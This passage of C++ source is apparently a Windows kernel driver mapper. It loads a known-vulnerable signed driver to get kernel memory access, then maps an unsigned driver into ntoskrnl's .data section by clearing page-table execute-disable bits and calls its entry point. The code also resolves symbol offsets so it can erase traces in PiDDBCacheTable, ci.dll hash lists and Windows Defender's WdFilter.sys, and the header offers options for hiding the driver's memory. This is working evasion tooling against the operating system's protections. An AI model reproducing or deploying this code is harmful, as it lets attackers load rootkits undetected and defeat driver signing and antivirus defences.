  auto section_header = IMAGE_FIRST_SECTION(nt_headers);
  for (auto i = 0; i < nt_headers->FileHeader.NumberOfSections; ++i) {
    auto& section = section_header[i];

    // get section name for debugging
    char section_name[9] = {0};
    std::memcpy(section_name, section.Name, 8);

    mapper_log("SUCCESS", "processing section: %s (va: 0x%lx)", std::string(section_name).c_str(),
               section.VirtualAddress);

    // skip uninitialized sections (.bss, etc.)
    if (section.Characteristics & IMAGE_SCN_CNT_UNINITIALIZED_DATA) {
      mapper_log("SUCCESS", "skipping uninitialized section: %s",
                 std::string(section_name).c_str());
      continue;
    }

    // skip sections with no raw data
    if (section.SizeOfRawData == 0) {
      mapper_log("SUCCESS", "skipping section with no raw data: %s",
                 std::string(section_name).c_str());
      continue;
    }

    // validate section bounds
    if (section.PointerToRawData >= driver_data.size() ||
        section.VirtualAddress >= nt_headers->OptionalHeader.SizeOfImage) {
      mapper_log("ERROR", "invalid section bounds for: %s", std::string(section_name).c_str());
      return false;
    }

    // calc source and destination
    auto source = driver_data.data() + section.PointerToRawData;
    auto destination = reinterpret_cast<std::uint8_t*>(local_image) + section.VirtualAddress;

    // calc copy size (minimum of raw size and virtual size)
    auto copy_size = min(section.SizeOfRawData, section.Misc.VirtualSize);

    // ensure we don't copy beyond buffer bounds
    auto remaining_file_size = driver_data.size() - section.PointerToRawData;
    auto remaining_image_size = nt_headers->OptionalHeader.SizeOfImage - section.VirtualAddress;
    copy_size = std::min<std::size_t>({copy_size, remaining_file_size, remaining_image_size});

    // copy section data
    std::memcpy(destination, source, copy_size);

    mapper_log("SUCCESS", "copied section: %s (0x%lx bytes)", std::string(section_name).c_str(),
               copy_size);
  }

  return true;
}

auto driver_mapper_t::initialize() -> bool {
  mapper_log("SUCCESS", "initializing driver mapper...");

  auto privilege_status = g_utils->check_lock_memory_privilege();
  if (!NT_SUCCESS(privilege_status)) {
    auto ensure_status = g_utils->ensure_lock_memory_privilege();
    if (!NT_SUCCESS(ensure_status)) {
      mapper_log("ERROR", "failed to set SeLockMemoryPrivilege policy, insufficient permissions");
      return false;
    }

    if (!g_utils->enable_privilege(L"SeLockMemoryPrivilege")) {
      mapper_log("ERROR", "SeLockMemoryPrivilege was added to policy but cannot be enabled in "
                          "current process. Please restart application as administrator.");
      return false;
    }

    privilege_status = g_utils->check_lock_memory_privilege();
    if (!NT_SUCCESS(privilege_status)) {
      mapper_log("ERROR", "SeLockMemoryPrivilege exists but cannot be activated. Please log off/on "
                          "or restart system.");
      return false;
    }
  }

  mapper_log("SUCCESS", "SeLockMemoryPrivilege is active");

  // init dependencies
  if (!g_utils->initialize_dependencies()) {
    mapper_log("ERROR", "failed to initialize dependencies");
    return false;
  }

  // load vulnerable driver
  device_handle_ = g_service_manager->load_vulnerable_driver();
  if (!device_handle_ || device_handle_ == INVALID_HANDLE_VALUE) {
    mapper_log("ERROR", "failed to load vulnerable driver");
    return false;
  }

  // get ntoskrnl base
  ntoskrnl_base_ = g_utils->get_kernel_module_address("ntoskrnl.exe");
  if (!ntoskrnl_base_) {
    mapper_log("ERROR", "failed to get ntoskrnl.exe base address");
    cleanup();
    return false;
  }

  // verify driver integrity
  if (!g_service_manager->verify_driver_integrity(device_handle_, ntoskrnl_base_)) {
    mapper_log("ERROR", "driver integrity check failed");
    cleanup();
    return false;
  }

  // parse PDB for offsets
  offsets_ = resolve_pdb_offsets();

  // pdb parsing usually fails when you download the symbols too many times and
  // receive a rate limit from microsoft. in this case, i just chose two random
  // offsets from each loaded pdb to compare
  if (offsets_.ExAllocatePool2 == offsets_.ExFreePoolWithTag) {
    mapper_log("ERROR", "error parsing ntoskrnl.exe symbols");
    cleanup();
    return false;
  }

  if (offsets_.g_HashCacheLock == offsets_.g_KernelHashBucketList) {
    mapper_log("ERROR", "error parsing ci.dll symbols");
    cleanup();
    return false;
  }

  if (offsets_.MpBmDocOpenRules == offsets_.MpFreeDriverInfoEx) {
    mapper_log("ERROR", "error parsing WdFilter.sys symbols");
    cleanup();
    return false;
  }

  if (!cleanup_traces(g_service_manager->get_driver_name())) {
    mapper_log("ERROR", "trace cleaning failed");
    cleanup();
    return false;
  };

  initialized_ = true;
  mapper_log("SUCCESS", "driver mapper initialized successfully");
  return true;
}

auto driver_mapper_t::cleanup() -> void {
  if (device_handle_ && device_handle_ != INVALID_HANDLE_VALUE) {
    // unload vulnerable driver
    g_service_manager->unload_vulnerable_driver(device_handle_);
    device_handle_ = INVALID_HANDLE_VALUE;
  }
  initialized_ = false;
}

auto driver_mapper_t::allocate_driver_memory(std::uint32_t image_size,
                                             settings::driver_alloc_mode alloc_mode,
                                             settings::memory_type mem_type, bool destroy_headers)
    -> std::uint64_t {
  switch (alloc_mode) {
    case settings::driver_alloc_mode::ALLOC_IN_SYSTEM_CONTEXT:
      return allocate_in_system_context(image_size);

    case settings::driver_alloc_mode::ALLOC_IN_CURRENT_PROCESS_CONTEXT:
      return allocate_in_process_context(image_size, mem_type);

    case settings::driver_alloc_mode::ALLOC_IN_NTOSKRNL_DATA_SECTION:
      return allocate_in_ntoskrnl_section(image_size);

    default:
      return 0;
  }
}

auto driver_mapper_t::allocate_in_system_context(std::uint32_t size) -> std::uint64_t {
  auto allocated = g_memory_manager->allocate_independent_pages(device_handle_, size);
  if (!allocated) {
    return 0;
  }

  // set page protection
  if (!g_memory_manager->set_page_protection(device_handle_, allocated, size,
                                             PAGE_EXECUTE_READWRITE)) {
    g_memory_manager->free_independent_pages(device_handle_, allocated, size);
    return 0;
  }

  return allocated;
}

auto driver_mapper_t::allocate_in_process_context(std::uint32_t size,
                                                  settings::memory_type mem_type) -> std::uint64_t {
  bool use_large_page = (mem_type == settings::memory_type::LARGE_PAGE ||
                         mem_type == settings::memory_type::HUGE_PAGE);

  auto allocated =
      reinterpret_cast<std::uint64_t>(g_page_table_manager->allocate_within_current_process_context(
          device_handle_, g_utils->get_current_process_id(), size, use_large_page, true));

  return allocated;
}

auto driver_mapper_t::allocate_in_ntoskrnl_section(std::uint32_t size) -> std::uint64_t {
  const auto ntos_base = ntoskrnl_base_;
  if (!ntos_base) {
    mapper_log("ERROR", "ntoskrnl base not initialized");
    return 0;
  }

  // find the .data section
  std::uint32_t section_size = 0;
  auto section_base =
      g_utils->find_kernel_section(device_handle_, ".data", ntos_base, &section_size);
  if (!section_base || !section_size) {
    mapper_log("ERROR", "failed to find .data section in ntoskrnl");
    return 0;
  }

  mapper_log("SUCCESS", "found .data section at 0x%llx with size: 0x%x", section_base,
             section_size);

  // find unused space in the section
  auto unused_space =
      g_utils->find_unused_space(device_handle_, section_base, section_size, size, 0x1000);
  if (!unused_space) {
    mapper_log("ERROR", "failed to find %u bytes of unused space in .data section", size);
    return 0;
  }

  mapper_log("SUCCESS", "found unused space at: 0x%llx", unused_space);

  // make the pages executable
  for (auto current_addr = unused_space; current_addr < unused_space + size;
       current_addr += PAGE_SIZE) {
    auto pde_address = g_page_table_manager->get_pde_address(device_handle_, current_addr);
    if (!pde_address) {
      mapper_log("ERROR", "failed to get PDE address for 0x%llx", current_addr);
      return 0;
    }

    // read the PDE
    PDE_64 pde{};
    if (!g_memory_manager->read_memory(device_handle_, pde_address, &pde, sizeof(PDE_64))) {
      mapper_log("ERROR", "failed to read PDE at 0x%llx", pde_address);
      return 0;
    }

    // check if it's a large page (2MB)
    if (pde.LargePage) {
      pde.ExecuteDisable = 0;  // allow execution
      pde.Write = 1;           // allow read/write

      if (!g_memory_manager->write_memory(device_handle_, pde_address, &pde, sizeof(PDE_64))) {
        mapper_log("ERROR", "failed to write PDE at 0x%llx", pde_address);
        return 0;
      }
    } else {
      // handle 4KB pages
      auto pte_address = g_page_table_manager->get_pte_address(device_handle_, current_addr);
      if (!pte_address) {
        mapper_log("ERROR", "failed to get PTE address for 0x%llx", current_addr);
        return 0;
      }

      PTE_64 pte{};
      if (!g_memory_manager->read_memory(device_handle_, pte_address, &pte, sizeof(PTE_64))) {
        mapper_log("ERROR", "failed to read PTE at 0x%llx", pte_address);
        return 0;
      }

      pte.ExecuteDisable = 0;  // allow execution
      pte.Write = 1;           // allow read/write

      if (!g_memory_manager->write_memory(device_handle_, pte_address, &pte, sizeof(PTE_64))) {
        mapper_log("ERROR", "failed to write PTE at 0x%llx", pte_address);
        return 0;
      }
    }
  }

  mapper_log("SUCCESS", "successfully modified page tables for executable permissions");
  return unused_space;
}

auto driver_mapper_t::relocate_image(void* local_image, std::uint64_t kernel_base,
                                     std::uint64_t original_base) -> bool {
  auto delta = kernel_base - original_base;
  return g_pe_parser->relocate_image_by_delta(local_image, delta);
}

auto driver_mapper_t::resolve_imports(void* local_image) -> bool {
  return g_pe_parser->resolve_imports(local_image, device_handle_, ntoskrnl_base_);
}

auto driver_mapper_t::fix_security_cookie(void* local_image, std::uint64_t kernel_image_base)
    -> bool {
  return g_pe_parser->fix_security_cookie(local_image, kernel_image_base);
}

auto driver_mapper_t::call_driver_entry(std::uint64_t entry_point, std::uint64_t param1,
                                        std::uint64_t param2,
                                        bool pass_alloc_address_as_first_param,
                                        std::uint64_t allocated_base) -> NTSTATUS {
  NTSTATUS result = 0;

  if (pass_alloc_address_as_first_param) {
    param1 = allocated_base;
  }

  if (!g_memory_manager->call_kernel_function(device_handle_, &result, entry_point,
                                              offsets_.IoGetCurrentProcess,
                                              offsets_.MmCopyVirtualMemory, &offsets_)) {
    return STATUS_UNSUCCESSFUL;
  }

  return result;
}

auto driver_mapper_t::get_kernel_export(const std::string& module_name,
                                        const std::string& function_name) -> std::uint64_t {
  auto module_base = g_utils->get_kernel_module_address(module_name);
  if (!module_base) {
    return 0;
  }

  return g_utils->get_kernel_module_export(device_handle_, module_base, function_name);
}

auto driver_mapper_t::get_ntoskrnl_base() -> std::uint64_t {
  return ntoskrnl_base_;
}

auto driver_mapper_t::is_vulnerable_driver_loaded() -> bool {
  return g_service_manager->is_driver_running();
}

auto driver_mapper_t::cleanup_traces(const std::string& driver_name) -> bool {
  if (!device_handle_ || device_handle_ == INVALID_HANDLE_VALUE) {
    return false;
  }

  return g_trace_cleaner->clean_all_traces(device_handle_, driver_name);
}

auto driver_mapper_t::resolve_pdb_offsets() -> pdb_offsets {
  mapper_log("INFO", "downloading required PDBs...");

  std::string kernel = std::string(std::getenv("systemroot")) + "\\System32\\ntoskrnl.exe";
  std::string pdb_path = pdb_download(kernel);
  kernel.clear();

  if (pdb_path.empty()) {
    mapper_log("ERROR", "failed to download ntoskrnl.exe PDB");
    return {};
  }

  pdb_context pdb;
  if (!pdb_load(pdb_path, &pdb)) {
    mapper_log("ERROR", "failed to load ntoskrnl.exe PDB");
    return {};
  }

  auto ntoskrnl_base = driver_mapper_t::get_ntoskrnl_base();
  auto ci_dll_base = g_utils->get_kernel_module_address("ci.dll");
  auto wdfilter_base = g_utils->get_kernel_module_address("WdFilter.sys");

  // download and load ci.dll PDB if available
  std::string ci_pdb_path;
  pdb_context ci_pdb = {};
  bool ci_pdb_loaded = false;

  if (ci_dll_base) {
    std::string ci_path = std::string(std::getenv("systemroot")) + "\\System32\\ci.dll";
    ci_pdb_path = pdb_download(ci_path);
    if (!ci_pdb_path.empty() && pdb_load(ci_pdb_path, &ci_pdb)) {
      ci_pdb_loaded = true;
      mapper_log("SUCCESS", "loaded ci.dll PDB");
    } else {
      mapper_log("ERROR", "failed to load ci.dll PDB");
      return {};
    }
  }

  // download and load WdFilter.sys PDB if available
  std::string wdfilter_pdb_path;
  pdb_context wdfilter_pdb = {};
  bool wdfilter_pdb_loaded = false;

  if (wdfilter_base) {
    std::string wdfilter_path =
        std::string(std::getenv("systemroot")) + "\\System32\\drivers\\WdFilter.sys";
    wdfilter_pdb_path = pdb_download(wdfilter_path);
    if (!wdfilter_pdb_path.empty() && pdb_load(wdfilter_pdb_path, &wdfilter_pdb)) {
      wdfilter_pdb_loaded = true;
      mapper_log("SUCCESS", "loaded WdFilter.sys PDB");
    } else {
      mapper_log("ERROR", "failed to load WdFilter.sys PDB");
      return {};
    }
  }

  driver_mapper_t::pdb_offsets offsets = {
      driver_mapper_t::get_ntoskrnl_base(),
      0,
      0,
      0,
      0,
      0,
      // memory management (Mm) functions
      ntoskrnl_base + pdb_get_rva(&pdb, "MmGetPhysicalAddress"),
      ntoskrnl_base + pdb_get_rva(&pdb, "MmPfnDatabase"),
      ntoskrnl_base + pdb_get_rva(&pdb, "MmAllocateIndependentPages"),
      ntoskrnl_base + pdb_get_rva(&pdb, "MmSetPageProtection"),
      ntoskrnl_base + pdb_get_rva(&pdb, "MmFreeIndependentPages"),
      ntoskrnl_base + pdb_get_rva(&pdb, "MmAllocateContiguousMemory"),
      ntoskrnl_base + pdb_get_rva(&pdb, "MmFreeContiguousMemory"),
      ntoskrnl_base + pdb_get_rva(&pdb, "MmCopyMemory"),
      ntoskrnl_base + pdb_get_rva(&pdb, "MmGetVirtualForPhysical"),
      ntoskrnl_base + pdb_get_rva(&pdb, "MmCopyVirtualMemory"),
      ntoskrnl_base + pdb_get_rva(&pdb, "MmMarkPhysicalMemoryAsBad"),
      ntoskrnl_base + pdb_get_rva(&pdb, "MmUserProbeAddress"),
      ntoskrnl_base + pdb_get_rva(&pdb, "MmGetSystemRoutineAddress"),
      ntoskrnl_base + pdb_get_rva(&pdb, "MmGetPhysicalMemoryRanges"),
      ntoskrnl_base + pdb_get_rva(&pdb, "MmIsAddressValid"),
      ntoskrnl_base + pdb_get_rva(&pdb, "MmAllocateSecureKernelPages"),
      ntoskrnl_base + pdb_get_rva(&pdb, "MmPhysicalMemoryBlock"),

      // memory info (Mi) functions
      ntoskrnl_base + pdb_get_rva(&pdb, "MiGetVmAccessLoggingPartition"),
      ntoskrnl_base + pdb_get_rva(&pdb, "MiCreateDecayPfn"),
      ntoskrnl_base + pdb_get_rva(&pdb, "MiGetUltraPage"),
      ntoskrnl_base + pdb_get_rva(&pdb, "MiReservePtes"),
      ntoskrnl_base + pdb_get_rva(&pdb, "MiGetPteAddress"),
      ntoskrnl_base + pdb_get_rva(&pdb, "MiGetPdeAddress"),
      ntoskrnl_base + pdb_get_rva(&pdb, "MiSystemPartition"),
      ntoskrnl_base + pdb_get_rva(&pdb, "MiInitializePfn"),
      ntoskrnl_base + pdb_get_rva(&pdb, "MiGetPage"),
      ntoskrnl_base + pdb_get_rva(&pdb, "MiWaitForFreePage"),
      ntoskrnl_base + pdb_get_rva(&pdb, "MiRemovePhysicalMemory"),
      ntoskrnl_base + pdb_get_rva(&pdb, "MiFlushEntireTbDueToAttributeChange"),
      ntoskrnl_base + pdb_get_rva(&pdb, "MiFlushCacheRange"),
      ntoskrnl_base + pdb_get_rva(&pdb, "MiPinDriverAddressLog"),
      ntoskrnl_base + pdb_get_rva(&pdb, "MiGetPageTablePfnBuddyRaw"),
      ntoskrnl_base + pdb_get_rva(&pdb, "MiSetPageTablePfnBuddy"),
      ntoskrnl_base + pdb_get_rva(&pdb, "MiLockPageTablePage"),
      ntoskrnl_base + pdb_get_rva(&pdb, "MiAllocateLargeZeroPages"),

      // proc/obj management functions
      ntoskrnl_base + pdb_get_rva(&pdb, "PsLoadedModuleList"),
      ntoskrnl_base + pdb_get_rva(&pdb, "PsAcquireProcessExitSynchronization"),
      ntoskrnl_base + pdb_get_rva(&pdb, "PsReleaseProcessExitSynchronization"),
      ntoskrnl_base + pdb_get_rva(&pdb, "PsGetProcessExitStatus"),
      ntoskrnl_base + pdb_get_rva(&pdb, "PsSetCreateThreadNotifyRoutine"),
      ntoskrnl_base + pdb_get_rva(&pdb, "PsSetCreateProcessNotifyRoutineEx"),
      ntoskrnl_base + pdb_get_rva(&pdb, "PsLookupProcessByProcessId"),
      ntoskrnl_base + pdb_get_rva(&pdb, "PsLookupThreadByThreadId"),
      ntoskrnl_base + pdb_get_rva(&pdb, "PsGetNextProcessThread"),
      ntoskrnl_base + pdb_get_rva(&pdb, "PsSuspendThread"),
      ntoskrnl_base + pdb_get_rva(&pdb, "PsResumeThread"),
      ntoskrnl_base + pdb_get_rva(&pdb, "PsQueryThreadStartAddress"),
      ntoskrnl_base + pdb_get_rva(&pdb, "PsGetCurrentThreadId"),
      ntoskrnl_base + pdb_get_rva(&pdb, "PsGetProcessPeb"),
      ntoskrnl_base + pdb_get_rva(&pdb, "PsGetProcessImageFileName"),
      ntoskrnl_base + pdb_get_rva(&pdb, "PsGetCurrentProcess"),
      ntoskrnl_base + pdb_get_rva(&pdb, "ObfDereferenceObject"),

      // processor support functions
      ntoskrnl_base + pdb_get_rva(&pdb, "PspExitThread"),

      // executive functions
      ntoskrnl_base + pdb_get_rva(&pdb, "ExAllocatePool2"),
      ntoskrnl_base + pdb_get_rva(&pdb, "ExFreePoolWithTag"),
      ntoskrnl_base + pdb_get_rva(&pdb, "ExGetPreviousMode"),

      // kernel executive functions
      ntoskrnl_base + pdb_get_rva(&pdb, "KeBalanceSetManager"),
      ntoskrnl_base + pdb_get_rva(&pdb, "KeRaiseIrqlToDpcLevel"),
      ntoskrnl_base + pdb_get_rva(&pdb, "KzLowerIrql"),
      ntoskrnl_base + pdb_get_rva(&pdb, "KiProcessListHead"),
      ntoskrnl_base + pdb_get_rva(&pdb, "KiPageFault"),
      ntoskrnl_base + pdb_get_rva(&pdb, "KeFlushSingleTb"),
      ntoskrnl_base + pdb_get_rva(&pdb, "KeQuerySystemTimePrecise"),
      ntoskrnl_base + pdb_get_rva(&pdb, "KiKvaShadow"),
      ntoskrnl_base + pdb_get_rva(&pdb, "KeInitializeApc"),
      ntoskrnl_base + pdb_get_rva(&pdb, "KeInsertQueueApc"),
      ntoskrnl_base + pdb_get_rva(&pdb, "KeUserModeCallback"),
      ntoskrnl_base + pdb_get_rva(&pdb, "KeAlertThread"),
      ntoskrnl_base + pdb_get_rva(&pdb, "KeDelayExecutionThread"),

      // runtime library functions
      ntoskrnl_base + pdb_get_rva(&pdb, "RtlInitAnsiString"),
      ntoskrnl_base + pdb_get_rva(&pdb, "RtlInitUnicodeString"),
      ntoskrnl_base + pdb_get_rva(&pdb, "RtlAnsiStringToUnicodeString"),
      ntoskrnl_base + pdb_get_rva(&pdb, "RtlCompareUnicodeString"),
      ntoskrnl_base + pdb_get_rva(&pdb, "RtlFreeUnicodeString"),
      ntoskrnl_base + pdb_get_rva(&pdb, "RtlGetVersion"),
      ntoskrnl_base + pdb_get_rva(&pdb, "RtlCreateUserThread"),

      ntoskrnl_base + pdb_get_rva(&pdb, "ZwOpenProcess"),
      ntoskrnl_base + pdb_get_rva(&pdb, "ZwClose"),
      ntoskrnl_base + pdb_get_rva(&pdb, "ZwWaitForSingleObject"),
      ntoskrnl_base + pdb_get_rva(&pdb, "NtQueryInformationProcess"),
      ntoskrnl_base + pdb_get_rva(&pdb, "NtAlertResumeThread"),

      // debug functions
      ntoskrnl_base + pdb_get_rva(&pdb, "DbgPrint"),

      // crt functions
      ntoskrnl_base + pdb_get_rva(&pdb, "memcpy"),
      ntoskrnl_base + pdb_get_rva(&pdb, "memset"),
      ntoskrnl_base + pdb_get_rva(&pdb, "memcmp"),
      ntoskrnl_base + pdb_get_rva(&pdb, "strncmp"),
      ntoskrnl_base + pdb_get_rva(&pdb, "strlen"),
      ntoskrnl_base + pdb_get_rva(&pdb, "_wcsicmp"),
      ntoskrnl_base + pdb_get_rva(&pdb, "rand"),
      ntoskrnl_base + pdb_get_rva(&pdb, "srand"),
      ntoskrnl_base + pdb_get_rva(&pdb, "swprintf_s"),
      ntoskrnl_base + pdb_get_rva(&pdb, "_snprintf"),

      // struct offsets
      pdb_get_struct_property_offset(&pdb, "_EPROCESS", L"ActiveProcessLinks"),
      pdb_get_struct_property_offset(&pdb, "_EPROCESS", L"ThreadListHead"),
      pdb_get_struct_property_offset(&pdb, "_KPROCESS", L"ThreadListHead"),
      pdb_get_struct_property_offset(&pdb, "_EPROCESS", L"SharedCommitLinks"),
      pdb_get_struct_property_offset(&pdb, "_EPROCESS", L"SharedCommitCharge"),
      pdb_get_struct_property_offset(&pdb, "_EPROCESS", L"RundownProtect"),
      pdb_get_struct_property_offset(&pdb, "_EPROCESS", L"Vm"),
      pdb_get_struct_property_offset(&pdb, "_EPROCESS", L"Flags3"),

      // trace cleaning - ntoskrnl
      ntoskrnl_base + pdb_get_rva(&pdb, "PiDDBCacheTable"),
      ntoskrnl_base + pdb_get_rva(&pdb, "PiDDBLock"),

      // trace cleaning - ci.dll
      ci_pdb_loaded ? (ci_dll_base + pdb_get_rva(&ci_pdb, "g_KernelHashBucketList")) : 0,
      ci_pdb_loaded ? (ci_dll_base + pdb_get_rva(&ci_pdb, "g_PEProcessHashBucketList")) : 0,
      ci_pdb_loaded ? (ci_dll_base + pdb_get_rva(&ci_pdb, "g_PEProcessList")) : 0,
      ci_pdb_loaded ? (ci_dll_base + pdb_get_rva(&ci_pdb, "g_HashCacheLock")) : 0,
      ci_pdb_loaded ? (ci_dll_base + pdb_get_rva(&ci_pdb, "g_CiEaCacheLookasideList")) : 0,
      ci_pdb_loaded ? (ci_dll_base + pdb_get_rva(&ci_pdb, "g_CiValidationLookasideList")) : 0,
      ntoskrnl_base + pdb_get_rva(&pdb, "RtlPcToFileName"),

      // trace cleaning - WdFilter.sys
      wdfilter_pdb_loaded ? (wdfilter_base + pdb_get_rva(&wdfilter_pdb, "MpBmDocOpenRules")) : 0,
      wdfilter_pdb_loaded ? (wdfilter_base + pdb_get_rva(&wdfilter_pdb, "MpFreeDriverInfoEx")) : 0,
  };

  pdb_unload(pdb_path, &pdb);

  if (ci_pdb_loaded) {
    pdb_unload(ci_pdb_path, &ci_pdb);
  }

  if (wdfilter_pdb_loaded) {
    pdb_unload(wdfilter_pdb_path, &wdfilter_pdb);
  }

  return offsets;
}

auto driver_mapper_t::get_pdb_offsets() const -> const pdb_offsets& {
  return offsets_;
}
```

`client/driver_mapper/driver_mapper.hpp`:

```hpp
#pragma once

#include <Windows.h>
#include <cstdint>
#include <vector>
#include <string>
#include <memory>

// class forward declarations
class memory_manager_t;
class service_manager_t;
class trace_cleaner_t;
class page_table_manager_t;
class pe_parser_t;
class utils_t;

#define PAGE_SIZE 0x1000

// driver allocation modes
namespace settings {

  enum class driver_alloc_mode {
    ALLOC_IN_SYSTEM_CONTEXT,
    ALLOC_IN_NTOSKRNL_DATA_SECTION,
    ALLOC_IN_CURRENT_PROCESS_CONTEXT
  };

  // memory types
  enum class memory_type {
    NORMAL_PAGE,
    LARGE_PAGE,
    HUGE_PAGE
  };

  // hide types for MmPfnDatabase
  enum class hide_type {
    NONE,
    PFN_EXISTS_BIT,
    MI_REMOVE_PHYSICAL_MEMORY,
    SET_PARITY_ERROR,
    SET_LOCK_BIT,
    HIDE_TRANSLATION
  };

  // additional options
  enum class experimental_options {
    NONE,
    MANIPULATE_SYSTEM_PARTITION
  };
}  // namespace settings

class driver_mapper_t {
public:
  driver_mapper_t() = default;
  ~driver_mapper_t() = default;

  // main mapping interface
  auto map_driver(
      std::vector<std::uint8_t>& driver_data, std::uint64_t param1 = 0, std::uint64_t param2 = 0,
      bool free_after_exec = false, bool destroy_headers = true,
      bool pass_alloc_address_as_first_param = false, NTSTATUS* exit_code = nullptr,
      settings::driver_alloc_mode alloc_mode = settings::driver_alloc_mode::ALLOC_IN_SYSTEM_CONTEXT,
      settings::memory_type mem_type = settings::memory_type::NORMAL_PAGE,
      settings::hide_type driver_hide = settings::hide_type::NONE,
      settings::hide_type dll_hide = settings::hide_type::NONE,
      settings::experimental_options experimental_options = settings::experimental_options::NONE)
      -> std::uint64_t;

  auto prepare_local_image(void* local_image, const std::vector<std::uint8_t>& driver_data,
                           PIMAGE_NT_HEADERS64 nt_headers) -> bool;

  // kernel function resolution
  auto get_kernel_export(const std::string& module_name, const std::string& function_name)
      -> std::uint64_t;
  auto get_ntoskrnl_base() -> std::uint64_t;

  // PDB and symbol resolution
  struct pdb_offsets {
    // driver vars
    uintptr_t NtoskrnlBase;
    uintptr_t DriverAllocBase;
    uintptr_t DriverSize;
    uint32_t DriverHideType;
    uint32_t DllHideType;
    uint32_t ExperimentalOptions;

    // memory management (Mm)
    uintptr_t MmGetPhysicalAddress;
    uintptr_t MmPfnDatabase;
    uintptr_t MmAllocateIndependentPages;
    uintptr_t MmSetPageProtection;
    uintptr_t MmFreeIndependentPages;
    uintptr_t MmAllocateContiguousMemory;
    uintptr_t MmFreeContiguousMemory;
    uintptr_t MmCopyMemory;
    uintptr_t MmGetVirtualForPhysical;
    uintptr_t MmCopyVirtualMemory;
    uintptr_t MmMarkPhysicalMemoryAsBad;
    uintptr_t MmUserProbeAddress;
    uintptr_t MmGetSystemRoutineAddress;
    uintptr_t MmGetPhysicalMemoryRanges;
    uintptr_t MmIsAddressValid;
    uintptr_t MmAllocateSecureKernelPages;
    uintptr_t MmPhysicalMemoryBlock;

    // memory info (Mi) functions
    uintptr_t MiGetVmAccessLoggingPartition;
    uintptr_t MiCreateDecayPfn;
    uintptr_t MiGetUltraPage;
    uintptr_t MiReservePtes;
    uintptr_t MiGetPteAddress;
    uintptr_t MiGetPdeAddress;
    uintptr_t MiSystemPartition;
    uintptr_t MiInitializePfn;
    uintptr_t MiGetPage;
    uintptr_t MiWaitForFreePage;
    uintptr_t MiRemovePhysicalMemory;
    uintptr_t MiFlushEntireTbDueToAttributeChange;
    uintptr_t MiFlushCacheRange;
    uintptr_t MiPinDriverAddressLog;
    uintptr_t MiGetPageTablePfnBuddyRaw;
    uintptr_t MiSetPageTablePfnBuddy;
    uintptr_t MiLockPageTablePage;
    uintptr_t MiAllocateLargeZeroPages;

    // proc/obj management
    uintptr_t PsLoadedModuleList;
    uintptr_t PsAcquireProcessExitSynchronization;
    uintptr_t PsReleaseProcessExitSynchronization;
    uintptr_t PsGetProcessExitStatus;
    uintptr_t PsSetCreateThreadNotifyRoutine;
    uintptr_t PsSetCreateProcessNotifyRoutineEx;
    uintptr_t PsLookupProcessByProcessId;
    uintptr_t PsLookupThreadByThreadId;
    uintptr_t PsGetNextProcessThread;
    uintptr_t PsSuspendThread;
    uintptr_t PsResumeThread;
    uintptr_t PsQueryThreadStartAddress;
    uintptr_t PsGetCurrentThreadId;
    uintptr_t PsGetProcessPeb;
    uintptr_t PsGetProcessImageFileName;
    uintptr_t IoGetCurrentProcess;
    uintptr_t ObfDereferenceObject;

    // processor support functions
    uintptr_t PspExitThread;

    // executive functions
    uintptr_t ExAllocatePool2;
    uintptr_t ExFreePoolWithTag;
    uintptr_t ExGetPreviousMode;

    // kernel executive functions
    uintptr_t KeBalanceSetManager;
    uintptr_t KeRaiseIrqlToDpcLevel;
    uintptr_t KeLowerIrql;
    uintptr_t KiProcessListHead;
    uintptr_t KiPageFault;
    uintptr_t KeFlushSingleTb;
    uintptr_t KeQuerySystemTimePrecise;
    uintptr_t KiKvaShadow;
    uintptr_t KeInitializeApc;
    uintptr_t KeInsertQueueApc;
    uintptr_t KeUsermodeCallback;
    uintptr_t KeAlertThread;
    uintptr_t KeDelayExecutionThread;

    // runtime library
    uintptr_t RtlInitAnsiString;
    uintptr_t RtlInitUnicodeString;
    uintptr_t RtlAnsiStringToUnicodeString;
    uintptr_t RtlCompareUnicodeString;
    uintptr_t RtlFreeUnicodeString;
    uintptr_t RtlGetVersion;
    uintptr_t RtlCreateUserThread;

    // Zw/Nt functions
    uintptr_t ZwOpenProcess;
    uintptr_t ZwClose;
    uintptr_t ZwWaitForSingleObject;
    uintptr_t ZwQueryInformationProcess;
    uintptr_t NtAlertResumeThread;

    // debug
    uintptr_t DbgPrint;

    // crt functions
    uintptr_t memcpy;
    uintptr_t memset;
    uintptr_t memcmp;
    uintptr_t strncmp;
    uintptr_t strlen;
    uintptr_t _wcsicmp;
    uintptr_t rand;
    uintptr_t srand;
    uintptr_t swprintf_s;
    uintptr_t snprintf;

    // offsets

    uintptr_t ActiveProcessLinks;
    uintptr_t _EPROCESS_ThreadListHead;
    uintptr_t _KPROCESS_ThreadListHead;
    uintptr_t _EPROCESS_SharedCommitLinks;
    uintptr_t _EPROCESS_SharedCommitCharge;
    uintptr_t _EPROCESS_RundownProtect;
    uintptr_t _EPROCESS_Vm;
    uintptr_t _EPROCESS_Flags3;

    // trace cleaning - ntoskrnl
    uintptr_t PiDDBCacheTable;
    uintptr_t PiDDBLock;

    // trace cleaning - ci.dll
    uintptr_t g_KernelHashBucketList;
    uintptr_t g_PEProcessHashBucketList;
    uintptr_t g_PEProcessList;
    uintptr_t g_HashCacheLock;
    uintptr_t g_CiEaCacheLookasideList;
    uintptr_t g_CiValidationLookasideList;
    uintptr_t RtlPcToFileName;

    // trace cleaning - WdFilter.sys
    uintptr_t MpBmDocOpenRules;
    uintptr_t MpFreeDriverInfoEx;
  };

  auto get_pdb_offsets() const -> const pdb_offsets&;
  auto get_device_handle() -> HANDLE {
    return device_handle_;
  }

  // Utility methods
  auto is_vulnerable_driver_loaded() -> bool;
  auto cleanup_traces(const std::string& driver_name) -> bool;

private:
  // core mapping logic
  auto allocate_driver_memory(std::uint32_t image_size, settings::driver_alloc_mode alloc_mode,
                              settings::memory_type mem_type, bool destroy_headers)
      -> std::uint64_t;

  auto copy_pe_sections(void* local_image, const std::vector<std::uint8_t>& driver_data) -> bool;

  auto relocate_image(void* local_image, std::uint64_t kernel_base, std::uint64_t original_base)
      -> bool;

  auto resolve_imports(void* local_image) -> bool;

  auto fix_security_cookie(void* local_image, std::uint64_t kernel_image_base) -> bool;

  auto call_driver_entry(std::uint64_t entry_point, std::uint64_t param1, std::uint64_t param2,
                         bool pass_alloc_address_as_first_param, std::uint64_t allocated_base)
      -> NTSTATUS;

  // mem allocation helpers
  auto allocate_in_system_context(std::uint32_t size) -> std::uint64_t;
  auto allocate_in_process_context(std::uint32_t size, settings::memory_type mem_type)
      -> std::uint64_t;
